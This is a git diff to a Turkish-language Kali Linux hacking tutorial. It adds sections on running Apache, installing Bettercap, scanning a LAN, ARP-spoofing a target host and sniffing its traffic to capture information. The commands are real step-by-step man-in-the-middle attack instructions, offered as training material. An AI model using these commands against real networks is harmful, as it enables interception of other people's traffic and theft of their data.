@@ -63,6 +63,10 @@
       - [Nmap](#nmap)
     - [Man In The Middle (Ortadaki Adam/MITM)](#man-in-the-middle-ortadaki-adammitm)
       - [ARP Spoof (ARP Kandırma)](#arp-spoof-arp-kand%c4%b1rma)
+    - [Web Sunucu Kurmak](#web-sunucu-kurmak)
+    - [Bettercap](#bettercap)
+      - [Bettercap ile ARP Spoof](#bettercap-ile-arp-spoof)
+      - [Bilgileri Çalmak](#bilgileri-%c3%87almak)
 
 # Giriş
 Bu döküman **Linux** işletim sisteminin **Kali Linux** dağıtımı üzerinde hazırlanmıştır. İlgili sistem bilgileri aşağıda bulunmaktadır.<br>
@@ -710,3 +714,32 @@ Temel komut dizimi şu şekildedir:
 # arpspoof -i eth0 -t 192.168.1.1 192.168.1.218
 # echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
+### Web Sunucu Kurmak
+- `systemctl start apache2` komutu ile birlikte Kali makinamızda default gelen apache2 sunucusunu başlatabiliriz
+- `cd /var/www/html/` komutu ile www klasörüne geçiyoruz. Sunucumuz içerisindeki dosyalar bu klasörden serve edilir. IP'ye istek gelince bu sunucu altındaki `index.html` gösterilir
+- Makinamızın IP adresine istek atarsak bu dizindeki `index.html` gösterilecektir
+
+### Bettercap
+- MITM saldırılarını yapmamıza yardımcı olan tool
+- `apt-get install bettercap` komutu ile tool'u makinamıza yüklüyoruz
+- Tool'u açmak için temel komut dizilimi -> `bettercap -iface <interface>`
+- Programı açtıktan sonra:
+  - `nmap` ile yaptığımız işlemi burada da yapabiliriz
+  - `net.probe on` komutu ile birlikteağdaki IP adreslerini ve MAC adreslerini bulabiliriz
+  - `net.show` komutu ile tüm ağları daha detaylı tablo olarak görebiliriz
+
+![Bettercap Net.Probe On & Net.Show](./assets/15-bettercap-netprobe-netshow.png)
+#### Bettercap ile ARP Spoof 
+- `set arp.spoof.fullduplex true` -> komutu ile ARP spoof modumuzu etkin hale getirdik
+- `set arp.spoof.targets 192.168.1.218` -> komutu ile hedef IP adresimizi belirtiyoruz. Başka hedeflerimiz de varsa `,` ayırarak argüman olarak yollayabiliriz
+- `arp.spoof on` -> komutu ile ARP Spoof saldırımızı başlatabiliriz
+- Hedef makinamızda ARP tablosuna bakarsak, modem (192.168.1.1) ile Kali makinamızın (192.168.1.87) MAC adreslerinin aynı olduğunu göreceğiz
+![Bettercap ARP Spoof](./assets/16-arp-spoof-bettercap.png)
+#### Bilgileri Çalmak
+`net.sniff on` -> Komutu ile hedef makina(/lar)mızdaki paketleri dinlemeye başlayabiliriz.
+- Aşağıdaki örnek hedef makina dinlenirken `google.com` isteği attığında yakalanmıştır
+
+- Bu yöntemler genelde **HTTP** sitelerde çalışacaktır. HTTPS siteleri kırmayı aşağıdaki başlıklarda göreceğiz
+
+![Bettercap Net Sniffing](./assets/17-bettercap-net-sniff.png)
+
